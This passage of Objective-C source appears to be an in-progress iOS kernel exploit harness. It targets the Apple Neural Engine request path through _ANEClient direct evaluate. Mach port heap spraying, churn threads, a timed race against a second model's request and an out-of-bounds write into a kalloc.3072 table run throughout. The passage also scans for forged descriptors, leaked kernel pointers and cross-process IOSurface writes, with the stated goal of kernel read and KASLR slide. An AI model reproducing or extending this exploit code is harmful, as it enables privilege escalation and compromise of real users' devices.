                memcpy(g_foreignSnap, snapB, sizeof(g_foreignSnap));
                g_foreignSnapValid = 1;
            }
        }
        if (g_foreignOutSid) {
            [out appendFormat:@"  [v56] OUT-SID TARGET=%u useCount=%u "
                              @"snap0=%02x%02x%02x%02x %02x%02x%02x%02x (stillness-checked)\n",
                g_foreignOutSid, g_foreignUsePre,
                g_foreignSnap[0], g_foreignSnap[1], g_foreignSnap[2], g_foreignSnap[3],
                g_foreignSnap[4], g_foreignSnap[5], g_foreignSnap[6], g_foreignSnap[7]];
        } else if (nFirst > 0) {
            [out appendString:@"  [v56] no still foreign candidate across 1.2 s re-diff — "
                              @"all movers (own CoreML/Siri staging); lane NOT armed this tap\n"];
        }
        if (foreignHits > 0) {
            [out appendString:@"  *** FOREIGN SURFACES RESOLVE BY ID. v56 re-read (note 126): "
                              @"the band is most likely OUR OWN CoreML staging surfaces — "
                              @"lookup is probably task-scoped, NOT cross-process proof. "
                              @"The request's OUTPUT binds to the stillness-checked target "
                              @"(size 0x4000 = A's expected output size). ***\n"];
            [out appendString:@"  first foreign sids:"];
            for (size_t k = 0; k < nFirst; k++) [out appendFormat:@" %u", forFirst[k]];
            [out appendString:@"\n"];
        } else {
            [out appendString:@"  [ ] lookup task-scoped (no foreign hits) — cross-process "
                              @"needs the clobber/consume lane as planned\n"];
        }
    } else {
        [out appendString:@"  [!] IOSurfaceLookup dlsym failed — census skipped\n"];
    }
    p044_write_log(out);

    // 3b. _ANEModel/_ANEClient load — evaluate must run on the SAME
    //     sharedConnection (run#1: fresh conn -> sel0 kr=0x5, sel2 0xe00002c2)
    [out appendString:@"\n=== PHASE 3b: _ANEModel/_ANEClient load (sharedConnection) ===\n"];
    NSURL *milURL = [self findMilModelURL:out];
    /* v61b: on the MIL lane modelURL is nil — keep the v56 lane-fix alive by
       falling back to the bundled 254in addchain .mlmodelc as TRANSPORT ONLY
       (MIL handle==0 retries the mlmodelc URL so the direct lane still arms).
       It is NOT model A; the request stays p044_req_in() inputs from OUR
       surfaces. */
    NSURL *transportFallback = modelURL ?: [[NSBundle mainBundle]
        URLForResource:@"XVRC27_254in_1out_addchain" withExtension:@"mlmodelc"];
    p044_ane_load_model(milURL ?: modelURL, transportFallback, out);
    p044_write_log(out);

    // 3c. Build _ANERequest — 191 input surfaces = OUR sids, BEFORE the spray
    [out appendFormat:@"\n=== PHASE 3c: build _ANERequest (%ux0x4000 inputs + 1x0x4000 output, sids -> forge set) ===\n", p044_req_in()];
    g_aneReqOk = p044_ane_build_request(out);
    if (!g_aneReqOk) {
        [out appendString:@"  [!] request not built — fire falls back to CoreML 191 predict (ids[] neutered)\n"];
    }
    p044_write_log(out);

    // 3. Create features
    MLDictionaryFeatureProvider *provider = [self createFeatures:out];
    if (!provider) { p044_write_log(out); return out; }

    // 3b. B provider + baseline predict (v47 E4: pre-spray yB1)
    MLDictionaryFeatureProvider *providerB = [self providerB:out];
    if (!providerB) { p044_write_log(out); return out; }
    [out appendString:@"\n=== PHASE 3e: B baseline predict (pre-spray yB1) ===\n"];
    g_yB1 = [self predictB:modelB provider:providerB tag:@"pre-spray" out:out];
    [out appendString:@"  B sentinel: all-613 baseline (v47 1..127 min was y=1, insensitive). Expect yB=613.\n"];
    p044_write_log(out);

    // 4. Start heap churn BEFORE spray
    [out appendString:@"\n=== PHASE 4c: heap churn seed (LuminaKRW effect) ===\n"];
    struct rlimit rl = { 0x10000, 0x10000 };
    setrlimit(RLIMIT_NOFILE, &rl);
    g_churn_go = 1;
    pthread_t churnTid;
    pthread_create(&churnTid, NULL, churn_worker, NULL);
    [NSThread sleepForTimeInterval:CHURN_SETTLE_SEC];
    [out appendFormat:@"  churn running (%d-socket create/close loop)\n", CHURN_BATCH];
    p044_write_log(out);

    // 5. Spray
    mach_port_t *drain = NULL;
    pair_t *pairs = [self sprayOut:out drain:&drain];
    if (!pairs || !drain) {
        [out appendString:@"  STOP: Spray failed\n"];
        g_churn_go = 0;
        pthread_join(churnTid, NULL);
        p044_write_log(out);
        return out;
    }
    p044_write_log(out);

    // 5b. NEON witnesses after spray, before fire
    [out appendFormat:@"\n=== PHASE 4d: NEON witnesses (%d threads, V0..V31 magic) ===\n",
        NEON_WITNESS_COUNT];
    [self startWitnesses:out];
    p044_write_log(out);

    [out appendString:@"\n=== PHASE 4e: NEON control scan (pre-fire, expect all-match) ===\n"];
    [self neon_scan:out tag:@"control-pre-fire"];
    p044_write_log(out);

#if P044_CONTROL_RECV
    [out appendString:@"\n=== PHASE 4f: control recv (one port-kind victim, pre-fire) ===\n"];
    [self controlRecv:pairs out:out];
    p044_write_log(out);
#else
    [out appendString:@"\n=== PHASE 4f: control recv DISABLED (P044_CONTROL_RECV=0) ===\n"];
    p044_write_log(out);
#endif

    // 4g. v50 CONSUME-FORGE WINDOW: B's predict starts ~1ms before A's fire.
    [out appendString:@"\n=== PHASE 4g: B concurrent predict (t-1ms; consume-forge window) ===\n"];
    NSMutableString *bBuf = [NSMutableString string];
    __block double yBcLocal = NAN;
    dispatch_semaphore_t bDone = dispatch_semaphore_create(0);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        yBcLocal = [self predictB:modelB provider:providerB tag:@"concurrent" out:bBuf];
        dispatch_semaphore_signal(bDone);
    });
    usleep(1000); /* stagger */
    [out appendString:@"  B launched t-1ms. HOLE_MODE=1 frees holes ASCENDING -> freelist top = highest "
        @"hole; B's mapRequest object pops the top, A's fire pops the next-lower hole = the chunk "
        @"PHYSICALLY BELOW B's. A's fill (entries 192..254 from obj+0xC00) therefore lands INSIDE "
        @"B's live mapRequest object at B_obj+0x64 = B's entries 6..68 become OUR staged sids "
        @"while B's prewire is still in flight (note 118 s4 consume-path forge).\n"];
    [out appendString:@"  Signals: B y change (B read OUR 16KB staged surfaces), B error (geometry "
        @"mismatch mid-prewire), or B wedge. If A's object instead pops the top, the fill lands in "
        @"the victim band - the v49-style port-kind hit is the fallback observation.\n"];
    p044_write_log(out);

    // 6. FIRE — v48.1 G1/G2: _ANEClient doEvaluateDirectWithModel, ids[] = OUR request surfaces
    [out appendFormat:@"\n=== PHASE 5: FIRE — _ANEClient doEvaluateDirectWithModel (%u request surfaces) ===\n", p044_req_in()];
    [out appendFormat:@">>> ids[] = OUR staged surface sids, indices 0..%u -> records [our sid][k][1][1]; count=%u = exactly in-bounds vs the 192-record kalloc.3072 table (B1: NO spill expected) <<<\n",
        p044_req_in() - 1, p044_req_in()];
    [out appendString:@">>> CheckandPrewire: capacity 192, NO bound check, 16B stride INLINE in kalloc.3072 <<<\n"];
    [out appendString:@">>> B1 in-bounds: panic NOT expected — if it panics anyway, the ips IS evidence (KASLR included) <<<\n\n"];
    p044_write_log(out);

    NSString *fireMode = @"not-attempted";
    int fireRc = -1;
    BOOL predOK = NO;

    /* v61c: re-snapshot the lane target IMMEDIATELY pre-fire. The arm-time
       snapshot (PHASE 3c) predates B's baseline/concurrent predicts and the
       spray — anything writing the target band in that gap pollutes the 6f
       diff (the 16:57 EMBERFORGE candidate: 2 B at offset 0 = 0x000060ca
       could have been our own B/CoreML staging, not the request path — the
       arm snapshot was taken BEFORE B's baseline predict ran). Re-validate
       (alias + size) and re-snap here so the 6f oracle measures only the
       fire window. B concurrent stays t-1ms by design (consume-forge). */
    if (g_foreignOutSid != 0 && p044_sfLookup) {
        CFTypeRef fPre = p044_sfLookup(g_foreignOutSid);
        if (!fPre) {
            [out appendFormat:@"  [v61c] PRE-FIRE: sid %u no longer resolves — lane dropped\n",
                g_foreignOutSid];
            g_foreignOutSid = 0;
        } else {
            BOOL oursPre = NO;
            for (uint32_t k = 0; k < g_nSurf && !oursPre; k++)
                if (g_surfs[k] && CFEqual(g_surfs[k], fPre)) oursPre = YES;
            size_t fszPre = p044_sfAllocSz ? p044_sfAllocSz(fPre) : 0;
            if (oursPre || (fszPre != 0 && fszPre != P044_REQ_OUT_BYTES)) {
                [out appendFormat:@"  [v61c] PRE-FIRE: sid %u aliased/size %zu — lane dropped\n",
                    g_foreignOutSid, fszPre];
                CFRelease(fPre);
                g_foreignOutSid = 0;
            } else {
                if (p044_sfLock(fPre, 1, NULL) == 0) {
                    uint8_t *bPre = (uint8_t *)p044_sfBase(fPre);
                    if (bPre) { memcpy(g_foreignSnap, bPre, sizeof(g_foreignSnap)); g_foreignSnapValid = 1; }
                    p044_sfUnlock(fPre, 1, NULL);
                }
                g_foreignUsePre = p044_sfUseCount ? p044_sfUseCount(fPre) : 0;
                CFRelease(fPre);
                [out appendFormat:@"  [v61c] PRE-FIRE SNAPSHOT REFRESHED: sid=%u useCount=%u\n",
                    g_foreignOutSid, g_foreignUsePre];
            }
        }
    }

    if (g_aneModelOk && g_aneReqOk) {
        fireMode = @"client-evaluate";
        fireRc = p044_ane_client_fire(out);
        if (fireRc == 1) {
            [out appendString:@"  client fire: evaluate ok\n"];
        } else if (fireRc == 0) {
            [out appendString:@"  [!] evaluate returned NO — kernel rejected; NOT re-firing with CoreML this boot (one fire per tap)\n"];
        } else {
            [out appendString:@"  [!] evaluate not attempted\n"];
        }
    } else {
        [out appendString:@"  _ANEClient lane unavailable — falling back to CoreML 191 predict (ids[] neutered)\n"];
        fireMode = @"coreml-fallback";
    }
    if ([fireMode isEqual:@"coreml-fallback"]) {
    if (!model) {
        [out appendString:@"  model A absent (MIL lane) — CoreML fallback predict skipped; "
                          "the ANE fire evidence is the oracle this boot\n"];
    } else {
    NSError *err = nil;
    id<MLFeatureProvider> prediction = [model predictionFromFeatures:provider error:&err];
        predOK = (prediction != nil);
    if (prediction) {
            [out appendFormat:@"  inference ok — prediction returned (%@)\n",
                p044_model_is_addchain()
                    ? @"UNEXPECTED with addchain — check model"
                    : @"non-addchain: OK only if the OUTPUT record did NOT steer to the foreign sid"];
    } else {
            [out appendFormat:@"  prediction FAILED: %@ (code=%ld) — %@\n",
                err ? err.localizedDescription : @"<nil>", err ? (long)err.code : 0L,
                p044_model_is_addchain()
                    ? @"EXPECTED with addchain"
                    : @"non-addchain: expected when the OUTPUT record steered to the foreign sid (the result went to THEIR memory — oracle is the 6f diff)"];
        }
    }
    }
    [out appendFormat:@"  fire=%@ rc=%d pred=%s\n", fireMode, fireRc, predOK ? "OK" : "FAILED"];
    p044_write_log(out);

    /* v50: join the concurrent B predict and read the consume-forge signal */
    long bW = dispatch_semaphore_wait(bDone, dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC));
    [out appendString:@"\n=== PHASE 5b: B concurrent result (consume-forge signal) ===\n"];
    [out appendString:bBuf];
    g_yBc = yBcLocal;
    if (bW != 0) {
        [out appendString:@"  [!] B concurrent predict STILL IN FLIGHT 15s - B wedged mid-prewire "
            @"(possible forge hit; check the panic pack if the boot dies)\n"];
    } else if (isnan(g_yBc) && !isnan(g_yB1)) {
        [out appendString:@"  *** B CONCURRENT PREDICT ERRORED - B's prewire smashed mid-flight by "
            @"A's fill (consume-forge candidate) ***\n"];
    } else if (!isnan(g_yB1) && !isnan(g_yBc) && g_yB1 != g_yBc) {
        [out appendFormat:@"  *** B Y CHANGED with OUR sids clobbering B's table (yB1=%.0f yBc=%.0f) "
            @"- B bound OUR staged surfaces: CONSUME-PATH FORGE candidate (bar half two) ***\n",
            g_yB1, g_yBc];
    } else if (!isnan(g_yBc)) {
        [out appendString:@"  [*] B concurrent predict unchanged (A popped the top hole -> fill "
            @"landed in the victim band, or B's object was not adjacent this fire)\n"];
    }
    p044_write_log(out);

    [out appendString:@"\n=== PHASE 5c: NEON scan t+0 ===\n"];
    int neonPost = [self neon_scan:out tag:@"t+0"];
    p044_write_log(out);

    // 7. Immediate victim scan (t+0)
    [out appendString:@"\n=== PHASE 6: Immediate victim scan (t+0) ===\n"];
    int hits = [self scanVictims:pairs out:out];
    [out appendFormat:@"  t+0 victim hits=%d\n", hits];
    if (!predOK) {
        if (hits > 0) {
            [out appendFormat:@"  NOTE: no predict return but OOB signals present (hits=%d) — fire may be a corruption effect.\n", hits];
        } else if ([fireMode isEqual:@"coreml-fallback"]) {
            [out appendString:@"  NOTE: predict FAILED and no t+0 signals yet — see watcher window.\n"];
        }
    }
    p044_write_log(out);

    // 6d. B post-fire predict (v47 E4: second live request)
    [out appendString:@"\n=== PHASE 6d: B post-fire predict (yB2, second live request) ===\n"];
    g_yB2 = [self predictB:modelB provider:providerB tag:@"post-fire" out:out];
    if (isnan(g_yB2) && !isnan(g_yB1)) {
        [out appendString:@"  *** B POST-FIRE ERROR — request state smashed (yB1 was fine) ***\n"];
    } else if (!isnan(g_yB1) && !isnan(g_yB2) && g_yB1 != g_yB2) {
        [out appendFormat:@"  *** B Y CHANGED across fire (yB1=%.0f yB2=%.0f) — B consumed smashed records ***\n",
            g_yB1, g_yB2];
    } else if (!isnan(g_yB1) && !isnan(g_yB2)) {
        [out appendString:@"  [*] B unchanged across the fire (no smash reach into B's records)\n"];
    }
    p044_write_log(out);

    // 6e. Reclaim read-back (v48 F4: freed-hole lane — panic-B shape)
    [out appendString:@"\n=== PHASE 6e: reclaim read-back (fresh 0xc00 surfaces may reuse the spilled hole) ===\n"];
    int reclaimHits = [self reclaimReadbackOut:out];
    [out appendFormat:@"  reclaim read-back: forged=%d hits=%d\n", g_cls_readback, reclaimHits];
    p044_write_log(out);

    // 6f (v52) FOREIGN OUTPUT READ-BACK — the OUTPUT-SID LANE oracle.
    //   The foreign target was snapshotted pre-fire. If the ANE inference ran
    //   anywhere in the request path, its result (or its scratch write) now
    //   lives in the foreign surface: cross-process WRITE. Use count bump =
    //   mapping happened even if inference was rejected downstream.
    [out appendString:@"\n=== PHASE 6f: foreign output read-back (OUTPUT-SID LANE oracle) ===\n"];
    if (g_foreignOutSid == 0) {
        [out appendString:@"  [ ] no foreign target this boot (census empty or lookup fallback) — lane idle\n"];
        } else {
        CFTypeRef f = p044_sfLookup(g_foreignOutSid);
        if (!f) {
            [out appendFormat:@"  [!] foreign sid %u no longer resolves post-fire\n", g_foreignOutSid];
        } else {
            if (p044_sfUseCount) g_foreignUsePost = p044_sfUseCount(f);
            g_foreignLockRc = p044_sfLock(f, 1, NULL); /* read-only */
            if (g_foreignLockRc == 0) {
                uint8_t *b = (uint8_t *)p044_sfBase(f);
                if (b) {
                    /* v59: FULL 0x4000 diff (snap was 64B before — we were blind
                       to everything past byte 64; now0=586a0000 constant across
                       runs with different input sums says bytes 0..7 are a
                       header/status word, NOT the addchain output). */
                    g_foreignDiff = 0;
                    for (size_t i = 0; i < sizeof(g_foreignSnap); i++)
                        if (b[i] != g_foreignSnap[i]) g_foreignDiff++;
                    [out appendFormat:@"  foreign sid=%u useCount %u->%u lockRO=ok diff=%d/16384 "
                                      @"now0=%02x%02x%02x%02x %02x%02x%02x%02x\n",
                        g_foreignOutSid, g_foreignUsePre, g_foreignUsePost, g_foreignDiff,
                        b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]];

                    /* v59: changed-word map — u32 granularity, old→new, cap 64 words.
                       This locates the real payload region(s) inside the surface. */
                    if (g_foreignDiff > 0) {
                        int words = 0;
                        [out appendString:@"  [v59] changed words (off u32 old->new):\n"];
                        for (size_t off = 0; off + 4 <= sizeof(g_foreignSnap) && words < 64; off += 4) {
                            uint32_t o = *(uint32_t *)&g_foreignSnap[off];
                            uint32_t n = *(uint32_t *)&b[off];
                            if (o != n) {
                                [out appendFormat:@"    0x%04zx: %08x -> %08x\n", off, o, n];
                                words++;
                            }
                        }
                        if (words == 64)
                            [out appendString:@"    ... (capped at 64 words — see sidecar dump)\n"];
                    }

                    /* v59: expected-sum scan — if the ANE wrote the addchain
                       output, the CoreML-lane expected sum (u32 LE) appears
                       somewhere in the surface. Also scan fp16. */
                    if (!isnan(g_expectedSum)) {
                        uint32_t want = (uint32_t)g_expectedSum;
                        int found = 0;
                        for (size_t off = 0; off + 4 <= sizeof(g_foreignSnap); off += 4) {
                            if (*(uint32_t *)&b[off] == want) {
                                [out appendFormat:@"  [v59] EXPECTED SUM %.0f (0x%08x u32 LE) FOUND at off 0x%04zx\n",
                                    g_expectedSum, want, off];
                                found++;
                                if (found >= 4) break;
                            }
                        }
                        if (!found)
                            [out appendFormat:@"  [v59] expected sum %.0f (0x%08x) not present as u32 LE — "
                                              @"payload is not the raw integer sum (see sidecar)\n",
                                g_expectedSum, want];
                    }

                    /* v60 passthrough content oracle: scan for OUR staged
                       input fill pattern (0xNN×4 u32, N in 0x41..0x50 — the
                       per-surface fill bytes). If the passthrough output
                       carried input content into the foreign surface, these
                       words appear = OUR bytes in THEIR memory. */
                    {
                        int pat = 0;
                        for (size_t off = 0; off + 4 <= sizeof(g_foreignSnap); off += 4) {
                            uint32_t w = *(uint32_t *)&b[off];
                            uint8_t n0 = (uint8_t)(w & 0xff);
                            if (n0 >= 0x41 && n0 <= 0x50 &&
                                w == ((uint32_t)n0 * 0x01010101u)) {
                                if (pat == 0)
                                    [out appendFormat:@"  [v60] INPUT PATTERN 0x%02x%02x%02x%02x FIRST at off 0x%04zx "
                                                    @"(our staged input fill in the FOREIGN surface)\n",
                                        n0, n0, n0, n0, off];
                                pat++;
                            }
                        }
                        if (pat > 0)
                            [out appendFormat:@"  [v60] INPUT PATTERN WORDS=%d — passthrough carried OUR content "
                                            @"into the FOREIGN surface (see sidecar)\n", pat];
                    }

                    /* v59: sidecar binary dump — full 0x4000 post-fire surface.
                       BUG FIX: /var/mobile/Documents is NOT app-sandbox-writable (open
                       failed 20:01 run). Use the SAME app-container Documents dir the
                       p044 log writes to. Pull via Filza/SSH from the app container:
                       .../Data/Application/&lt;UUID&gt;/Documents/p044_outdump.bin */
                    {
                        NSString *docs = NSSearchPathForDirectoriesInDomains(
                            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
                        NSString *dumpPath = [docs stringByAppendingPathComponent:@"p044_outdump.bin"];
                        int dfd = open(dumpPath.fileSystemRepresentation,
                                       O_CREAT | O_WRONLY | O_TRUNC, 0644);
                        if (dfd >= 0) {
                            ssize_t wr = write(dfd, b, sizeof(g_foreignSnap));
                            fcntl(dfd, F_FULLFSYNC);
                            close(dfd);
                            [out appendFormat:@"  [v59] sidecar dump written %zd/16384 B -> %@\n",
                                wr, dumpPath];
                        } else {
                            [out appendFormat:@"  [v59] sidecar dump open FAILED errno=%d path=%@\n",
                                errno, dumpPath];
                        }
                    }

                    if (g_foreignDiff > 0) {
                        [out appendFormat:
                            @"  *** ANE WRITE SIGNAL: output surface content CHANGED (%d/16384 bytes) "
                            @"across the fire — the consumer mapped sid %u and something in the "
                            @"request path WROTE it. Changed-word map + sidecar decide header vs "
                            @"real addchain payload. ***\n", g_foreignDiff];
                    } else {
                        [out appendString:@"  [ ] content unchanged (full 0x4000) — if useCount "
                                          @"bumped, the MAPPING happened but inference was rejected "
                                          @"before any write (expected: status 0x2 kills inference)\n"];
                    }
                }
                p044_sfUnlock(f, 1, NULL);
            } else {
                [out appendFormat:@"  [!] post-fire foreign lock rc=%d (content check skipped; "
                                  @"useCount %u->%u still reported)\n",
                    g_foreignLockRc, g_foreignUsePre, g_foreignUsePost];
            }
            CFRelease(f);
        }
    }
    p044_write_log(out);

    // 8. Stop churn, start late watcher over the queued drains
    g_churn_go = 0;
    pthread_join(churnTid, NULL);
    [out appendString:@"  churn stopped\n"];
    p044_write_log(out);

    g_watchDrain = drain;
    g_watchScanned = calloc(DRAIN_COUNT, 1);
    pthread_t watchTid;
    BOOL watcherStarted = NO;
    if (g_watchScanned) {
        g_watch_go = 1;
        if (pthread_create(&watchTid, NULL, watch_worker, NULL) == 0) {
            watcherStarted = YES;
        } else {
            g_watch_go = 0;
        }
    }

    if (watcherStarted) {
        [out appendFormat:@"\n=== PHASE 6b: late watcher running for %.0fs (delayed landings) ===\n",
            WATCH_SECONDS];
        p044_write_log(out);
        int ticks = (int)(WATCH_SECONDS / 5.0);
        for (int t = 0; t < ticks; t++) {
            [NSThread sleepForTimeInterval:5.0];
            neonPost += [self neon_scan:out tag:[NSString stringWithFormat:@"watch+%ds", (t + 1) * 5]];
            p044_write_log(out);
        }
        g_watch_go = 0;
        pthread_join(watchTid, NULL);
        pthread_mutex_lock(&g_evLock);
        int evc = g_evTotal;
        int evStored = g_evCount;
        pthread_mutex_unlock(&g_evLock);
        [out appendFormat:@"  watcher events=%d (stored=%d)\n", evc, evStored];
        p044_write_log(out);
    }

    [out appendString:@"\n=== PHASE 6c: NEON scan end ===\n"];
    neonPost += [self neon_scan:out tag:@"end"];
    p044_write_log(out);

    // 9. Detailed event dump
    [out appendString:@"\n=== EVENTS ===\n"];
    pthread_mutex_lock(&g_evLock);
    [out appendFormat:@"  captured=%d stored=%d (cap %d)\n", g_evTotal, g_evCount, EVENT_LOG_MAX];
    for (int e = 0; e < g_evCount; e++) {
        ev_t *ev = &g_events[e];
        switch (ev->kind) {
            case 1:
                [out appendFormat:@"  *** PORT-KIND SIGNAL victim=%u recv kr=0x%x corrupt_msgh_size=0x%x ***\n",
                    ev->idx, ev->kr, ev->corruptSize];
                break;
            case 2:
                [out appendFormat:@"  DRAIN-HIT drain=%u (LATE LANDING, inline corrupted)\n", ev->idx];
                hexdump16(ev->body, 0, out);
                kptr_scan(ev->body, ev->idx, out);
                break;
            case 3:
                [out appendFormat:
                    @"  *** PORT-KIND SIGNAL drain=%u recv kr=0x%x corrupt_msgh_size=0x%x — KERNEL REJECTED CORRUPTED DESCRIPTORS ***\n",
                    ev->idx, ev->kr, ev->corruptSize];
                break;
            case 4:
                [out appendFormat:
                    @"  *** INLINE-REJECTION victim=%u recv kr=0x%x corrupt_msgh_size=0x%x ***\n",
                    ev->idx, ev->kr, ev->corruptSize];
                break;
            case 5:
                [out appendFormat:@"  *** PORT-KIND HIT victim=%u (payload diff, see HIT line) ***\n", ev->idx];
                break;
            case 6:
                [out appendFormat:@"  *** DESC-TILE FORGE victim=%u recv kr=0x%x (8-desc probe rejected; record bytes on desc3..8) ***\n",
                    ev->idx, ev->kr];
                break;
            default:
                break;
        }
    }
    pthread_mutex_unlock(&g_evLock);
    p044_write_log(out);

    // VERDICT
    [out appendString:@"\n=== VERDICT ===\n"];
    [out appendFormat:@"  fire=%@ rc=%d t+0_hits=%d neon_postfire=%d events_total=%d\n",
        fireMode, fireRc, hits, neonPost, g_evTotal];
    [out appendFormat:@"  client: model=%d request=%d readback=%d\n",
        g_aneModelOk, g_aneReqOk, g_cls_readback];
    if (predOK && [fireMode isEqual:@"coreml-fallback"] && p044_model_is_addchain()) {
        [out appendString:@"\n*** MODEL FLAG: addchain model but prediction SUCCEEDED (unexpected) ***\n"];
    }
    if (predOK && g_foreignOutSid != 0) {
        [out appendString:@"\n*** LANE FLAG: prediction SUCCEEDED with the OUTPUT-SID lane armed — the OUTPUT record did NOT steer (the result landed in OUR output; foreign sid untouched) ***\n"];
    }
    if (!predOK && g_foreignDiff > 0) {
        [out appendFormat:@"\n*** EMBERFORGE CANDIDATE: prediction FAILED + foreign surface CHANGED (%d/16384 B) — the request wrote into the FOREIGN output; word map + sidecar decide the content. Milestone only on proven content. ***\n",
            g_foreignDiff];
    }
    BOOL conversion = (g_cls_desc_forged > 0) || (g_cls_body_forged > 0 && g_cls_kptr > 0);
    BOOL occupancy = ((g_cls_fp > 0) || (g_cls_forge_sid > 0)) && !conversion;
    [out appendFormat:@"\n=== CONVERSION BAR ===\n"];
    [out appendFormat:@"  fingerprint=%d kptr=%d kptr_tail>=0x3e0=%d\n",
        g_cls_fp, g_cls_kptr, g_cls_kptr_tail];
    [out appendFormat:@"  body_forged=%d desc_type_forged=%d kernel_reject=%d\n",
        g_cls_body_forged, g_cls_desc_forged, g_cls_reject];
    [out appendFormat:@"  desc_tile_reject=%d (v49 8-desc probe rejects = record bytes forged desc dispositions on a LIVE kmsg; NOT auto-conversion, kernel-visible desc-region forge)\n",
        g_cls_desc_reject];
[out appendFormat:@"  record_forge: forge_seen=%d out_entry=%d yB1=%s%.0f yB2=%s%.0f yBc=%s%.0f %s\n",
        g_cls_forge_sid, g_cls_out_entry,
        isnan(g_yB1) ? "<" : "", isnan(g_yB1) ? 0.0 : g_yB1,
        isnan(g_yB2) ? "<" : "", isnan(g_yB2) ? 0.0 : g_yB2,
        isnan(g_yBc) ? "<" : "", isnan(g_yBc) ? 0.0 : g_yBc,
        g_cls_forge_sid > 0 ? "BAR HALF ONE PASSED (client-chosen sids in spilled records)" : "(no client-chosen sids seen)"];
    if (g_cls_out_entry > 0)
        [out appendString:@"  *** A's OUTPUT entry spilled — full table spans inputs 192..253 + output 254 ***\n"];
    [out appendFormat:@"  foreign-lane: target=%u use %u->%u diff=%d/16384 %s\n",
        g_foreignOutSid, g_foreignUsePre, g_foreignUsePost, g_foreignDiff,
        g_foreignOutSid == 0 ? "(idle)" :
            (g_foreignDiff > 0 ? "*** ANE WRITE SIGNAL (output surface changed; see [v59] word map + p044_outdump.bin) ***" :
            (g_foreignUsePost != g_foreignUsePre ? "(mapped, no write — inference rejected)" : "(no change)"))];
    if (!isnan(g_yBc) && !isnan(g_yB1) && g_yB1 != g_yBc)
        [out appendString:@"  *** CONSUME-FORGE SIGNAL: yBc != yB1 with A's sids clobbering B's mapRequest table (bar half two candidate) ***\n"];
    [out appendFormat:@"  readback: reclaim_forged=%d (fresh 0xc00 IOSurface scan of the spilled hole)\n",
        g_cls_readback];
    [out appendFormat:@"  occupancy=%s  conversion=%s  hasKread=NO\n",
        occupancy ? "YES" : "NO", conversion ? "YES" : "NO"];
    if (conversion) {
        [out appendString:@"  CONVERSION CANDIDATE — forged descriptors or body+kptr. Still not kread32.\n"];
        [out appendString:@"  Do not recv fat type-3. KREAD button is commitSlide.\n"];
    } else if (occupancy) {
        [out appendString:@"  OCCUPANCY WRITE — pad is ANE {surfaceId,0xcN,1,1}, body stayed 2, desc type PORT.\n"];
        [out appendString:@"  Recv copied our extra back. That is not kread.\n"];
        if (g_cls_forge_sid > 0) {
            [out appendString:@"  *** FORGED-SID RECORDS PRESENT — spilled body carries client-chosen sids (Chain 1 Step 2) ***\n"];
            [out appendString:@"  Half one of the record-forge bar. Conversion still needs desc forge or kptr.\n"];
        }
    } else if (g_cls_forge_sid > 0) {
        [out appendString:@"\n*** FORGED-SID RECORDS WITHOUT OCCUPANCY HIT — see EVENTS dump ***\n"];
    }

    if (occupancy || conversion || hits > 0) {
        [out appendString:@"\n*** OOB WRITE CONFIRMED (occupancy store into kalloc.3072) ***\n"];
        if (hits == 0 && occupancy)
            [out appendString:@"t+0 miss; watcher caught the same extra (delayed recv, still occupancy).\n"];
        [out appendString:@"Fingerprint: [u32 surfaceId][u32 0xcN counter][1][1], 16B stride.\n"];
        [out appendString:@"KPTR lines (if any) = leftover kernel VA in the extra tail. Leak, not hasKread.\n"];
        [out appendString:@"PORT-KIND REJECT = kernel refused the kmsg. Not copyout conversion.\n"];
        [out appendString:@"commitSlide only after kread32(kbase)==MH_MAGIC_64. Use the KREAD button.\n"];
    } else if (g_evTotal > 0) {
        [out appendString:@"\n*** LATE-WINDOW EVENT CONFIRMED (watcher) ***\n"];
        [out appendString:@"Event without ANE fingerprint — see EVENTS. Still not hasKread.\n"];
    } else if (neonPost > 0) {
        [out appendString:@"\n*** NEON-WITNESS post-fire mismatch with no kmsg hits ***\n"];
        [out appendString:@"Thread NEON state moved; kalloc.3072 victims quiet. Not hasKread.\n"];
    } else if (predOK) {
        [out appendString:@"\nPredict succeeded (fallback lane) but no corruption detected.\n"];
    } else {
        [out appendString:@"\nNo corruption in the observation window.\n"];
        [out appendString:@"prediction FAILED and no kmsg/NEON signals — see prediction_status.\n"];
    }

    // Cleanup
    [out appendString:@"\n\n=== CLEANUP ===\n"];
    [self stopWitnesses];
    for (uint32_t i = 0; i < DRAIN_COUNT; i++) {
        if (drain[i]) {
            if (!g_watchScanned || !g_watchScanned[i]) {
                recv_msg(drain[i], NULL, RECV_WAIT_MS_EMPTY);
            }
            mach_port_destroy(mach_task_self(), drain[i]);
        }
    }
    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        if (pairs[i].victim) {
            if (!pairs[i].done) {
                recv_msg(pairs[i].victim, NULL, RECV_WAIT_MS_EMPTY);
            }
            mach_port_destroy(mach_task_self(), pairs[i].victim);
        }
        if (pairs[i].hole) mach_port_destroy(mach_task_self(), pairs[i].hole);
    }
    free(pairs);
    free(drain);
    if (g_watchScanned) {
        free(g_watchScanned);
        g_watchScanned = NULL;
    }
    g_watchDrain = NULL;
    {
        uint32_t released = g_nSurf;
        for (uint32_t i = 0; i < released; i++) {
            if (g_surfs[i]) {
                CFRelease(g_surfs[i]);
                g_surfs[i] = NULL;
            }
        }
        g_nSurf = 0;
        [out appendFormat:@"  forge surfaces released (%u)\n", released];
    }
    g_aneReq = nil;
    g_aneClient = nil;
    g_aneModelObj = nil;
    g_aneModelOk = 0;
    g_aneReqOk = 0;
    [out appendString:@"  _ANEClient lane released\n"];
    [out appendString:@"  cleanup done (witnesses joined)\n"];

    p044_write_log(out);
    return out;
}

@end
